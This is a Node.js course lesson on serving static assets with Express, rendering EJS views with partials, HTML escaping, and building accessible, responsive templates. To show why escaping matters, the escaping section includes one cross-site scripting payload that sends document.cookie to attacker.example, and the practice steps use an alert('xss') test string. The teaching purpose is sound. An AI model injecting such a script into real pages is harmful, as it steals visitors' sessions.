---
lesson_id: node101-06
course_id: node101
pathway: software-developer
title: Static Assets and Rendered Views
order: 6
kind: lesson
competency_ids:
  - D5-S1-C04
objectives:
  - Serve static assets and rendered views to a browser
---

## Two ways a file reaches the browser

Up to now every response the events board has sent was built in JavaScript — a string, an object, something you assembled inside a handler. A real site sends more than that. It sends a stylesheet, a logo, a font file, and pages of HTML. Those come from two different mechanisms, and confusing them is the source of most "why is my CSS 404ing" afternoons.

The first mechanism is **static file serving**. A request arrives for `/styles.css`, and the server's entire job is to find a file with that name on disk and stream its bytes back with the right `Content-Type`. Nothing is computed. The same request tomorrow produces the same bytes. There is no handler for it, no route, no `req.params`.

The second is **rendering a view**. A request arrives for `/events`, your handler looks up the events array, and a template engine combines an HTML template with that data to produce a page that did not exist as a file a moment ago. Every request can produce different HTML.

The distinction matters because they fail differently and they are optimized differently. A static asset can be cached hard by the browser and by anything in between, because it does not change until you deploy a new one. A rendered page usually cannot, because it reflects data that changes. A static asset that 404s is a path problem — the file is not where you told Express to look. A rendered page that 404s is a routing problem. Knowing which of the two you are debugging cuts the search in half.

Both live in the same application. The events board is about to serve a stylesheet from disk *and* a page listing the events from memory, and the ordering rules from lesson 05 govern how those two coexist, because static file serving is just another middleware.

## Serving a public directory

Express ships static serving as built-in middleware:

```js
import express from "express";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const app = express();

app.use(express.static(path.join(__dirname, "public")));
```

That is the whole feature. `express.static` takes a directory on disk and, for every incoming request, checks whether a file matching the URL path exists inside it. If one does, it sends the file and the request ends there. If not, it calls `next()` and the request continues into your routes.

Notice the `__dirname` reconstruction. This project uses ES modules (`"type": "module"` from lesson 02), and ES modules do not have `__dirname`. Two lines rebuild it from `import.meta.url`. Skip them and pass a bare `"public"` and Express resolves it relative to the **current working directory** — the directory you were standing in when you ran `node app.js`, not the directory the file lives in. It works when you run `node app.js` from the project root and breaks the moment anything runs it from elsewhere, which is exactly what a process manager on a host does. Always build an absolute path.

The directory layout that follows:

```text
events-board/
├── app.js
├── public/
│   ├── styles.css
│   └── img/
│       └── logo.svg
├── routes/
│   └── events.js
└── views/
```

The key thing to internalize is that **the directory name does not appear in the URL**. `public/styles.css` is served at `/styles.css`, not `/public/styles.css`. `public/img/logo.svg` is at `/img/logo.svg`. `express.static` mounts the *contents* of the folder at the mount point, which is `/` unless you say otherwise.

If you would rather the URLs be explicit, mount at a path:

```js
app.use("/static", express.static(path.join(__dirname, "public")));
```

Now the stylesheet is at `/static/styles.css`. Both are defensible. The mounted version has one practical advantage: it makes it impossible for a file in `public/` to shadow one of your routes. With a root mount, dropping a file called `events` into `public/` would intercept every request to `/events` before your router ever ran, because static middleware sits above the routes and responds first. That is the ordering rule from lesson 05 doing exactly what it is supposed to do, in a way you did not intend.

Which raises the ordering question directly: should `express.static` go above or below your routes? Above is the normal answer. Assets are requested constantly — every page load pulls the stylesheet — and putting the static check first means those requests never touch your routing table. The cost is the shadowing risk above, which a dedicated mount path or a disciplined `public/` folder removes.

Two failure modes to recognize:

- **The file is there and you still get a 404.** Check the resolved absolute path by logging `path.join(__dirname, "public")` on startup. Nine times in ten the path is wrong, not the file.
- **You get the page HTML instead of the stylesheet.** That means static did not match, your routes did not match, and some catch-all further down answered. The browser then refuses to apply it and logs a MIME type error in the console. Read that error as "the file was not found," because that is what it means.

Never point `express.static` at your project root. It will happily serve `package.json`, your `.env` if it is not excluded, and every file in `node_modules`. Serve a directory that contains only things you intend to publish.

One more thing `express.static` does for you, and it deserves a paragraph of its own because it is the source of a classic self-inflicted bug: **caching**. Every response it sends carries headers telling the browser what it may do with the file afterwards. By default, Express sends `Last-Modified` and an `ETag` — a short fingerprint of the file's contents. On the next request the browser sends the fingerprint back in an `If-None-Match` header, and if the file has not changed Express replies `304 Not Modified` with no body. The browser reuses what it already has.

That is already a real saving: the round trip still happens, but the bytes do not move. What it does not do is prevent the round trip. For assets that genuinely never change between deploys you can go further:

```js
app.use(
  express.static(path.join(__dirname, "public"), {
    maxAge: "1h",
  })
);
```

`maxAge` sets `Cache-Control: max-age=3600`, which tells the browser it may use its stored copy for an hour without asking at all. Fewer requests, faster pages.

The trap is obvious once stated: for that hour, you cannot change the file. You deploy a fix to `styles.css`, reload, and see the old stylesheet, because the browser did not ask. Then you spend twenty minutes debugging code that is already correct. This is why caching is the classic beginner footgun — the failure is invisible and it lies to you.

The practical rules at this stage of your learning:

- Leave `maxAge` at its default of zero during development. `ETag` still saves you bandwidth and it is always correct.
- If you set a long `maxAge` in production, change the *filename* when you change the file — `styles.a3f9c1.css` rather than `styles.css`. A new name is a new URL and a new URL is never cached. Build tools automate this; you do not need one yet, but you should know that is the trick.
- Hard-reload (shift-reload in most browsers) bypasses the cache, and your browser's dev tools have a "disable cache" checkbox that applies while they are open. When something looks stale, check there before you doubt your code.

Rendered views, which you are about to write, are a different case. They reflect data that changes and should not be cached by default — Express does not cache them, and you should not add caching to them.

## Rendering with a template engine

Building HTML by concatenating strings in a handler works for one line and collapses immediately after. You end up with unreadable quoting, no way to reuse a header, and — the serious one — no escaping, which is a security hole covered later in this lesson.

A template engine solves this. You write a file that is mostly HTML with small markers where data goes; the engine reads it, substitutes the data, and returns a string. Express supports many of them through one interface, and you configure it in two lines:

```bash
npm install ejs
```

```js
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));
```

This course uses **EJS**, and the choice is genuinely interchangeable. Pug, Handlebars, Nunjucks and others plug into the same `app.set("view engine", …)` slot and the same `res.render` call; only the template syntax differs. EJS is chosen here because its templates are plain HTML with `<% %>` tags inserted, so nothing you already know about HTML has to be relearned. If you land on a team using Handlebars, everything in this lesson transfers except the tag characters.

`app.set("views", …)` tells Express which directory to look in, and again you want an absolute path for the same reason as before. With the view engine set, Express appends `.ejs` for you.

A template for the events list, at `views/events.ejs`:

```html
<h1>Community Events</h1>

<ul class="event-list">
  <% for (const event of events) { %>
    <li>
      <a href="/events/<%= event.id %>"><%= event.title %></a>
      <p><%= event.location %></p>
    </li>
  <% } %>
</ul>
```

Two tag forms are doing all the work. `<% … %>` runs JavaScript and outputs nothing — that is the loop. `<%= … %>` evaluates an expression and outputs the result, escaped. Anything outside the tags is copied through as literal HTML.

The handler that uses it:

```js
router.get("/", (req, res) => {
  res.render("events", {
    title: "Community Events",
    events,
  });
});
```

`res.render(view, locals)` looks up `views/events.ejs`, runs it with the object you pass as the available variables, and sends the resulting HTML with a `Content-Type: text/html` header and a 200 status. You do not call `res.send` afterwards — `render` sends. Calling both is the double-response error from lesson 05.

The second argument is the **contract between your handler and your template**, and it is worth treating as one. The template can only see what you pass. A template referring to a variable you forgot to include throws a `ReferenceError` at render time, and because it happens inside the engine, the stack trace points at generated code rather than your file — which is confusing until you have seen it once. Keep the locals object small and named after what the page needs, not after what your data happens to be called internally.

The detail page follows the same shape:

```js
router.get("/:id", (req, res) => {
  const event = events.find((e) => e.id === req.params.id);
  if (!event) {
    return res.status(404).render("not-found", { title: "Event not found" });
  }
  return res.render("event-detail", { title: event.title, event });
});
```

Note that `res.status(404).render(...)` sets the status *and* renders a page. Status and body are independent; a 404 with a helpful HTML page is entirely normal. What that page should say when something has genuinely gone wrong on the server, and how errors get routed to it at all, is lesson 08's subject — here you are only doing the ordinary "this id does not exist" case that your own handler detects.

## Partials and a layout

The events list and the event detail page both need the same document shell: the doctype, the head, the stylesheet link, the site navigation, the footer. Copying that into every template means every future change happens in n places and one of them gets missed.

EJS solves this with **partials** — templates included inside other templates:

```html
<%- include("partials/head", { title }) %>
<%- include("partials/nav") %>

<main id="main">
  <h1><%= title %></h1>
  <!-- page content -->
</main>

<%- include("partials/footer") %>
```

`include` reads another template, renders it, and inserts the result. Note the tag: `<%- %>`, not `<%= %>`. The dash form outputs raw, unescaped content, which is what you need here because a partial's output *is* HTML and escaping it would show you the tags as text. That difference is the subject of the next section, and this is the one legitimate everyday use of the unescaped form.

The second argument to `include` passes locals down. A partial does inherit the parent's locals, but passing explicitly documents what the partial actually needs, which is worth the extra characters.

`views/partials/head.ejs`:

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title><%= title %> — Community Events</title>
    <link rel="stylesheet" href="/styles.css" />
  </head>
  <body>
    <a class="skip-link" href="#main">Skip to main content</a>
```

`views/partials/nav.ejs`:

```html
<header>
  <nav aria-label="Main">
      <ul>
        <li><a href="/">Home</a></li>
        <li><a href="/events">Events</a></li>
        <li><a href="/events/new">Add an event</a></li>
      </ul>
  </nav>
</header>
```

Splitting the document open-tags into `head.ejs` and the close-tags into `footer.ejs` works and is what a lot of EJS code does, but be honest about the cost: your HTML is now unbalanced across two files and an editor cannot check it for you. The tidier alternative is a layout package such as `express-ejs-layouts`, or moving to an engine with layouts built in. Either is fine. What is not fine is copy-pasting the shell into six templates.

One more thing the shell should carry: a small helper for values every page needs. If every page's `title` is passed in by hand, one handler will eventually forget it and render `undefined` into the browser tab. A middleware from lesson 05 can set a default:

```js
app.use((req, res, next) => {
  res.locals.title = "Community Events";
  next();
});
```

`res.locals` is an object merged into every `res.render` on that request, with the handler's own locals winning. It is the right home for values that are true for the whole site or for the whole request.

## Escaping, and why it is not optional

Look again at the two output tags:

- `<%= value %>` — escapes HTML special characters before output.
- `<%- value %>` — outputs the value as-is.

Escaping converts `<` into `&lt;`, `>` into `&gt;`, `&` into `&amp;`, and quotes into their entities. The browser then displays those characters as text rather than interpreting them as markup.

Why that matters becomes obvious with one example. The events board will let people submit events. Suppose someone submits an event whose title is:

```text
Pizza Night <script>fetch("https://attacker.example/steal?c=" + document.cookie)</script>
```

Rendered with `<%= event.title %>`, the visitor sees that entire string as the title of an event. Ugly, harmless.

Rendered with `<%- event.title %>`, the browser receives a real script tag, and runs it, on your domain, in the session of every visitor who loads the page. That is cross-site scripting, and it is not a theoretical category of bug — it is one of the most commonly exploited classes of web vulnerability, and this is exactly how it happens.

The rule: **`<%=` by default, always. `<%-` only for content you generated yourself**, such as an `include` or a snippet of markup your own code built. The instant the unescaped form touches anything a user typed, you have a hole. And "a user typed it" includes data that arrived through an API, was read out of a file, or was stored by an earlier version of your code — trust is about the origin, not about how recently it passed through your hands.

A second escaping context to be aware of: HTML escaping is correct for text between tags and for attribute values, but it is not correct for putting user data inside a `<script>` block or inside a URL. Those need JavaScript escaping and URL encoding respectively. If you find yourself templating a value into a script tag, stop and pass the data another way — a `data-` attribute the script reads, for instance.

Finally: escaping is a rendering concern, not a storage concern. Store what the user typed, exactly. Escape when you output. Escaping on the way in seems tempting and creates a mess where nobody can tell which copy of a string is encoded, and where the same value is double-escaped after passing through twice.

## Accessible and responsive templates

This is the competency this lesson is graded on, so it is not a section to skim. A page that only works for a sighted user with a mouse on a wide screen is not finished. The good news is that most of the work is decisions made while writing the template, not extra work bolted on afterwards.

**Use elements for what they mean.** Browsers and assistive technology derive structure from element names, and a page built out of generic containers communicates nothing. The events list page:

```html
<main id="main">
  <h1>Community Events</h1>

  <ul class="event-list">
    <% for (const event of events) { %>
      <li>
        <article>
          <h2><a href="/events/<%= event.id %>"><%= event.title %></a></h2>
          <p><%= event.location %></p>
          <p>
            <time datetime="<%= event.startsAt %>">
              <%= formatDate(event.startsAt) %>
            </time>
          </p>
        </article>
      </li>
    <% } %>
  </ul>
</main>
```

`main`, `nav`, `header`, `footer`, `article`, `time` — each one tells a screen reader user something a generic container does not, and each gives a keyboard user landmarks to jump between. A list of things is a list element, which lets a screen reader announce "list, twelve items" before reading any of them.

**Exactly one first-level heading per page, and no skipped levels.** The heading outline is how many people navigate a page: they pull up a list of headings and jump. That list is only useful if it reflects the actual structure. One `h1` naming the page, `h2` for each section or item, `h3` beneath those. Never pick a heading level because of how big it looks — that is what CSS is for.

**Every image needs an `alt`.** Descriptive when the image carries information, empty (`alt=""`) when it is purely decorative, because an empty alt tells the screen reader to skip it entirely while a missing alt makes it read out the filename.

```html
<img src="/img/logo.svg" alt="Community Events" />
<img src="/img/divider.svg" alt="" />
```

**Every form control needs a real label.** The events board's submission form:

```html
<form action="/events" method="post">
  <div class="field">
    <label for="title">Event title</label>
    <input id="title" name="title" type="text" required />
  </div>

  <div class="field">
    <label for="location">Location</label>
    <input id="location" name="location" type="text" required />
  </div>

  <div class="field">
    <label for="starts-at">Starts at</label>
    <input id="starts-at" name="startsAt" type="datetime-local" required />
  </div>

  <button type="submit">Add event</button>
</form>
```

The `for` attribute must match the input's `id` exactly, and the `id` must be unique on the page. That pairing does two things: a screen reader announces the label when focus reaches the field, and clicking the label focuses the field, which makes small targets usable for everyone. Placeholder text is not a label — it disappears the moment someone types, and it is not announced reliably.

Use the right `type` too. `type="email"`, `type="date"`, `type="datetime-local"` bring up the appropriate keyboard on a phone and give you free client-side checking. That checking is a convenience, not a guarantee — the server still has to verify what arrives, which lesson 07 takes up.

**The viewport meta tag is what makes a responsive layout work at all.** It is already in the `head` partial above:

```html
<meta name="viewport" content="width=device-width, initial-scale=1" />
```

Without it, a phone browser pretends to be about 980 pixels wide and shrinks the whole page to fit, so your careful mobile layout renders as a tiny, zoomed-out desktop page. Every media query you write is ignored. This one line is the highest-value character-for-character change in this entire lesson.

**Lay out fluidly, then adjust.** A responsive layout is not a set of fixed widths with breakpoints between them; it is a layout that has no fixed width in the first place, with breakpoints only where it genuinely stops looking right.

```css
:root {
  box-sizing: border-box;
}

*,
*::before,
*::after {
  box-sizing: inherit;
}

body {
  margin: 0;
  font-family: system-ui, sans-serif;
  line-height: 1.5;
}

.event-list {
  list-style: none;
  margin: 0 auto;
  padding: 1rem;
  max-width: 60rem;
  display: grid;
  gap: 1rem;
  grid-template-columns: repeat(auto-fit, minmax(16rem, 1fr));
}

img {
  max-width: 100%;
  height: auto;
}
```

The grid line does the responsive work without a single media query: `auto-fit` with `minmax` fits as many 16rem-minimum columns as the space allows and stretches them to fill. One column on a phone, four on a desktop, no breakpoints to maintain. `max-width` on images stops a large upload from forcing the page wider than the screen — horizontal scrolling on a phone is the most common responsive failure there is, and this one rule prevents most of it. Sizing in `rem` rather than `px` means the layout responds when someone has increased their browser's default font size, which a great many people have.

**Keep it usable from the keyboard.** Navigation must be reachable and operable with tab and enter. Real links (`a` with an `href`) and real buttons (`button`) are focusable and activatable for free; a clickable generic container is not, and making one behave correctly requires work you do not need to do if you use the right element. Do not remove the focus outline — `outline: none` with nothing in its place makes the page unusable for keyboard users. If the default outline is ugly, replace it:

```css
:focus-visible {
  outline: 3px solid currentColor;
  outline-offset: 2px;
}

.skip-link {
  position: absolute;
  left: -9999px;
}

.skip-link:focus {
  left: 0;
  top: 0;
  padding: 0.5rem 1rem;
  background: #fff;
}
```

The skip link in the `head` partial pairs with `<main id="main">`: a keyboard user landing on the page can jump straight past the navigation instead of tabbing through every link on every page. It is hidden until focused, so it costs sighted mouse users nothing.

**Check your work, do not assume it.** Three checks take five minutes and catch most of what goes wrong. Unplug the mouse and tab through the page: can you reach everything, and can you see where you are? Resize the browser to about 320 pixels wide: does anything scroll sideways or get cut off? Run the browser's built-in accessibility audit (in the dev tools) and read the findings — missing labels, contrast failures, and heading-order problems are all caught automatically.

## Practice

You will give the events board a browsable, accessible front end backed by static assets and rendered views.

1. Create `public/` next to `app.js` with a `styles.css` inside it, and mount it with `express.static` using an absolute path built from `import.meta.url`. Log the resolved path on startup and confirm it is what you expect.
2. Load `/styles.css` directly in the browser and confirm you get the file. Then deliberately mount `express.static` *below* your `/events` router, add a file named `events` (no extension) to `public/`, request `/events`, and record which one answered. Undo both changes and write one sentence explaining the result.
3. Install `ejs`, set `view engine` and `views`, and create `views/partials/head.ejs`, `views/partials/nav.ejs`, and `views/partials/footer.ejs`. The head partial must include the `charset` and viewport meta tags, the stylesheet link, a `title` from locals, and a skip link targeting `#main`.
4. Create `views/events.ejs` rendering the in-memory events array as a list, and change your `GET /events` handler to `res.render` it. Create `views/event-detail.ejs` and render it from `GET /events/:id`, returning `res.status(404).render("not-found", …)` when the id does not match.
5. Add an event whose title contains `<script>alert("xss")</script>` to your in-memory array. Render it once with `<%= %>` and once with `<%- %>`. Record exactly what the browser did in each case, then restore the escaped version.
6. Add `views/new-event.ejs` with a form posting to `/events`. Every control gets a `label` with a matching `for`/`id` pair, an appropriate `type`, and a submit `button`. Do not use placeholder text as a label.
7. Write the CSS: fluid `max-width` container, a grid with `auto-fit`/`minmax` for the event list, `max-width: 100%` on images, `rem` sizing, and a visible `:focus-visible` style.
8. Audit it. Tab through every page from the keyboard without touching the mouse and confirm you can reach and activate every link, the form, and the submit button, and that focus is always visible. Resize the window to 320 pixels wide and confirm nothing scrolls horizontally. Run the browser dev tools accessibility audit on the events list page.

**Deliverable:** the running application serving `/`, `/events`, `/events/:id`, and `/events/new` as rendered pages with a shared shell and a stylesheet loaded from `public/`, plus an `ACCESSIBILITY.md` in the project root recording the results of step 8: what the keyboard pass found, what the 320-pixel pass found, every issue the audit reported, and for each one either the fix you made or a one-line justification for leaving it. Include your written answer from step 5 about what escaping prevented.
